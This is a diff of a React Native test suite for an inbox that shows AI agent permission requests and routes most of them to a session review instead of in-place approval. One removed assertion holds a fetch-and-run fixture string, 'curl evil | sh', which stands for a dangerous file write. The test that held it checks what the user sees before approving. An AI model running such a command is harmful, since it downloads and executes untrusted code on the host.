@@ -27,7 +27,7 @@ import { router } from 'expo-router';
 import { randomUUID } from 'expo-crypto';
 
 import { HomeInbox, InboxCard, RESUME_PROMPT, replyFor } from './HomeInbox';
-import { INBOX_LINE_CLAMP, INBOX_REQUEST_MAX_HEIGHT } from '../inbox/InboxFeed';
+import { INBOX_LINE_CLAMP } from '../inbox/InboxFeed';
 
 const ZERO_USAGE = {
   inputTokens: 0,
@@ -315,10 +315,42 @@ it('decides a described permission without opening the session', async () => {
     }),
   ]);
   const allow = await screen.findByRole('button', { name: 'Allow once' });
+  expect(screen.getByText('Allow WebFetch?').props.numberOfLines).toBeUndefined();
+  expect(screen.getByTestId('inbox-line-code').props.children).toBe('https://api.exa.ai');
+  expect(screen.getByTestId('inbox-line-code').props.numberOfLines).toBeUndefined();
+  expect(screen.queryByTestId('inbox-request')).toBeNull();
   await act(async () => {
     fireEvent.press(allow);
   });
   expect(client.decidePermission).toHaveBeenCalledWith('egress', 't1', { behavior: 'allow' });
+});
+
+it('shows an unknown summary once and opens its session without approving', async () => {
+  const { client, onOpenSession } = await renderInbox([
+    session('firewall', {
+      status: 'awaiting_input',
+      permissionAwaitingInput: true,
+      pendingPermissions: ['repair'],
+      pendingPermissionRequests: [
+        {
+          toolUseId: 'repair',
+          tool: 'unknown_repair',
+          riskClass: 'ask',
+          input: {
+            summary: 'The investigation found the build failure. '.repeat(40),
+            changes: ['DNS helper'],
+          },
+        },
+      ],
+    }),
+  ]);
+  const review = await screen.findByRole('button', { name: 'Review' });
+  expect(screen.getAllByText(/^The investigation/)).toHaveLength(1);
+  expect(screen.queryByTestId('inbox-request')).toBeNull();
+  expect(screen.queryByRole('button', { name: 'Allow once' })).toBeNull();
+  fireEvent.press(review);
+  expect(onOpenSession).toHaveBeenCalledWith('firewall');
+  expect(client.decidePermission).not.toHaveBeenCalled();
 });
 
 it('opens the session for answers it cannot give in place', async () => {
@@ -421,9 +453,9 @@ it('keeps commands out of the overview and opens their session for review', asyn
   expect(screen.queryByRole('button', { name: 'Allow once' })).toBeNull();
 });
 
-it('keeps a write’s content in view next to Allow', async () => {
+it('opens the full write in its session instead of deciding from a path', async () => {
   // The path alone would be a summary of the call, not what it writes.
-  await renderInbox([
+  const { onOpenSession, client } = await renderInbox([
     session('writer', {
       status: 'awaiting_input',
       permissionAwaitingInput: true,
@@ -438,19 +470,20 @@ it('keeps a write’s content in view next to Allow', async () => {
       ],
     }),
   ]);
-  await screen.findByRole('button', { name: 'Allow once' });
-  expect(screen.getByTestId('inbox-line-code').props.children).toBe('/w/a.sh');
+  const review = await screen.findByRole('button', { name: 'Review' });
+  expect(screen.queryByRole('button', { name: 'Allow once' })).toBeNull();
+  expect(screen.queryByRole('button', { name: 'Deny' })).toBeNull();
+  expect(screen.queryByTestId('inbox-request')).toBeNull();
   expect(screen.queryByText('Full request')).toBeNull();
-  expect(screen.getByTestId('inbox-request').props.children).toContain('curl evil | sh');
-  // Whole but bounded: a long file would otherwise stretch the card past the screen.
-  const viewport = StyleSheet.flatten(screen.getByTestId('inbox-request-viewport').props.style);
-  expect(viewport).toMatchObject({ maxHeight: INBOX_REQUEST_MAX_HEIGHT });
+  fireEvent.press(review);
+  expect(onOpenSession).toHaveBeenCalledWith('writer');
+  expect(client.decidePermission).not.toHaveBeenCalled();
 });
 
-it('keeps a long message to a session short in the overview, whole one tap away', async () => {
+it('previews a long session message and reviews it in the correct session', async () => {
   // An agent's report to another session ran the full height of the work list.
   const message = Array.from({ length: 40 }, (_, i) => `Finding ${String(i)}.`).join('\n');
-  await renderInbox([
+  const { onOpenSession } = await renderInbox([
     session('messenger', {
       status: 'awaiting_input',
       permissionAwaitingInput: true,
@@ -465,14 +498,14 @@ it('keeps a long message to a session short in the overview, whole one tap away'
       ],
     }),
   ]);
-  await screen.findByRole('button', { name: 'Allow once' });
-  const line = screen.getByTestId('inbox-line-text');
-  expect(line.props.children).toBe(message);
-  expect(line.props.numberOfLines).toBe(INBOX_LINE_CLAMP);
-  // Clamped only because the complete input stays readable under it.
+  const review = await screen.findByRole('button', { name: 'Review' });
+  expect(screen.queryByRole('button', { name: 'Allow once' })).toBeNull();
+  expect(screen.queryByTestId('inbox-line-text')).toBeNull();
+  expect(screen.getByText(/^Finding 0/).props.numberOfLines).toBe(INBOX_LINE_CLAMP);
   expect(screen.queryByTestId('inbox-request')).toBeNull();
-  fireEvent.press(screen.getByText('Full request'));
-  expect(screen.getByTestId('inbox-request').props.children).toContain('Finding 39.');
+  expect(screen.queryByText('Full request')).toBeNull();
+  fireEvent.press(review);
+  expect(onOpenSession).toHaveBeenCalledWith('messenger');
 });
 
 it('keeps a session with a permission and a ready pull request in one card', async () => {
@@ -485,7 +518,12 @@ it('keeps a session with a permission and a ready pull request in one card', asy
       permissionAwaitingInput: true,
       pendingPermissions: ['t1'],
       pendingPermissionRequests: [
-        { toolUseId: 't1', tool: 'Bash', riskClass: 'ask', input: { command: 'ls' } },
+        {
+          toolUseId: 't1',
+          tool: 'Write',
+          riskClass: 'ask',
+          input: { file_path: '/w/a.sh', content: 'ls' },
+        },
       ],
       pr: { phase: 'open', pipeline: 'success', mergeable: true },
       pullRequest: {
@@ -531,13 +569,18 @@ it('shows only a compact secret-run approval with a session review action', asyn
       ],
     }),
   ]);
-  expect(await screen.findByText('Run trusted command with KUBECONFIG?')).toBeOnTheScreen();
+  expect(await screen.findByText(/Run trusted command with KUBECONFIG\?/)).toBeOnTheScreen();
   expect(screen.queryByTestId('inbox-line-code')).toBeNull();
   expect(screen.queryByTestId('inbox-line-text')).toBeNull();
   expect(screen.queryByTestId('inbox-request')).toBeNull();
   expect(screen.queryByText('Full request')).toBeNull();
   expect(screen.queryByRole('button', { name: 'Allow once' })).toBeNull();
   expect(screen.getByRole('button', { name: 'Review' })).toBeOnTheScreen();
+  // With nothing to decide in place, a card only broke the list: no lead mark,
+  // the tag beside a wrapping title, no chevron. It is a row like the plan's.
+  const needs = within(screen.getByTestId('work-needs-you'));
+  expect(needs.queryByTestId('inbox-item-permission')).toBeNull();
+  expect(needs.getByText('Permission')).toBeOnTheScreen();
 });
 
 describe('dismissing', () => {
@@ -755,9 +798,10 @@ it('leads with the permission and names the session’s question on the same car
   };
   const { onCountChange } = await renderInbox([waiting]);
   const needs = within(screen.getByTestId('work-needs-you'));
-  expect(needs.getByText('Permission needed')).toBeTruthy();
-  expect(needs.getAllByTestId(/^inbox-item-/)).toHaveLength(1);
-  expect(needs.getByTestId('inbox-also')).toHaveTextContent('Also waiting: Question');
+  // Nothing to decide in place, so the session is one row naming both.
+  expect(needs.getAllByText(/Permission needed/)).toHaveLength(1);
+  expect(needs.getByText(/Permission needed · Also waiting: Question/)).toBeTruthy();
+  expect(needs.queryByText('Which validation library?')).toBeNull();
   expect(needs.queryByRole('button', { name: 'Zod' })).toBeNull();
   expect(onCountChange).toHaveBeenLastCalledWith(1);
 });
@@ -863,7 +907,10 @@ it('lists recent sessions the sections above do not hold, newest first', async (
   const running = session('working', { status: 'running', lastActivityAt: 90 });
   const unread = session('unread', { eventCount: 8, lastSeenEventCount: 2, lastActivityAt: 80 });
   const quiet = Array.from({ length: 12 }, (_, index) =>
-    session(`quiet-${String(index)}`, { lastActivityAt: index + 1 }),
+    session(`quiet-${String(index)}`, {
+      lastMessageAt: index + 1,
+      lastActivityAt: 100 - index,
+    }),
   );
   await renderInbox([...quiet, running, unread]);
   const recent = within(screen.getByTestId('work-recent'));
@@ -919,6 +966,14 @@ it('draws a decision card as an entry of the work group, filled when selected', 
     ...question,
     sessionId: 'permission',
     pendingPermissions: ['permission-1'],
+    pendingPermissionRequests: [
+      {
+        toolUseId: 'permission-1',
+        tool: 'Write',
+        riskClass: 'ask',
+        input: { file_path: '/w/a.sh', content: 'ls' },
+      },
+    ],
     permissionAwaitingInput: true,
   });
   await renderInbox([waiting], fakeClient(), { selectedSessionId: waiting.sessionId });
@@ -935,4 +990,31 @@ it('draws a decision card as an entry of the work group, filled when selected', 
   expect(permissionCard.borderRadius).toBe(0);
   expect(permissionCard.backgroundColor).toBe(lightTheme.colors.surfaceAlt);
   expect(permissionCard.shadowColor).toBeUndefined();
+});
+
+// "Needs you" mixed a loose status dot on rows with cards that led with nothing,
+// so the entries started at three different insets. Every entry now leads with
+// its session's tile, and what it waits for sits on the tile's corner.
+it('leads every Needs you entry with the session tile and its corner mark', async () => {
+  const permission = session('permission', {
+    status: 'awaiting_input',
+    permissionAwaitingInput: true,
+    pendingPermissions: ['t1'],
+    pendingPermissionRequests: [
+      {
+        toolUseId: 't1',
+        tool: 'Write',
+        riskClass: 'ask',
+        input: { file_path: '/w/a.sh', content: 'ls' },
+      },
+    ],
+  });
+  await renderInbox([question, permission]);
+  const needs = within(await screen.findByTestId('work-needs-you'));
+  // An idle session with an open question: its corner takes the tag's tone.
+  expect(needs.getByTestId('work-waiting-form')).toBeOnTheScreen();
+  // The permission card leads with the same tile as the rows, the agent's "?" on it.
+  const card = within(needs.getByTestId('inbox-item-permission'));
+  expect(card.getByTestId('work-agent-permission')).toBeOnTheScreen();
+  expect(card.getByLabelText('Waiting for you')).toBeOnTheScreen();
 });
